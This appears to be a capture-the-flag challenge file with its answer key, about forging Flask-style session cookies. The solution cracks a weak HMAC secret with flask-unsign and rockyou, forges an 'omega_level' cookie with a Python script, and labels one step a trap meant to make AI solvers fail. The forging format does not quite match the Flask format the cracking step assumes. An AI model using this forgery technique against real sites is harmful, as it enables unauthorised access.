# Challenge 28

## Title
Stark's Keycard

## Difficulty
Medium

## Points
200

## Description
Stark Tower's access control portal uses session cookies to manage clearance levels. You're logged in as a field operative — but the resource you need requires Omega Level clearance. Tony Stark rolled his own session signing. That's never a good idea.

## Service
Live web challenge — provided URL on competition day.

## Hint
*"Is it possible to build something that won't kill you?"* — Tony asked that about suits. Ask it about secret keys.

## Solution
**Step 1:** Visit `/login` to receive a signed session cookie.

**Step 2:** Decode the cookie (base64) — reveals `{"user": "agent", "role": "field_operative"}`.

**Step 3:** Crack the HMAC secret with flask-unsign:
```bash
flask-unsign --unsign --cookie "<cookie>" --wordlist rockyou.txt
# Secret: avengers
```

**Step 4:** Forge a new cookie — **AI trap here**: AI forges `role=admin` (standard assumption). The app explicitly checks for `role=omega_level` (visible on the access denied page). Admin gets denied.

```python
import hmac, hashlib, base64, json
SECRET = "avengers"
data = {"user": "agent", "role": "omega_level"}
payload = base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')
sig = hmac.new(SECRET.encode(), payload.encode(), hashlib.sha1).hexdigest()
print(f"{payload}.{sig}")
```

**Step 5:** Set the forged cookie in browser → access granted → flag revealed.
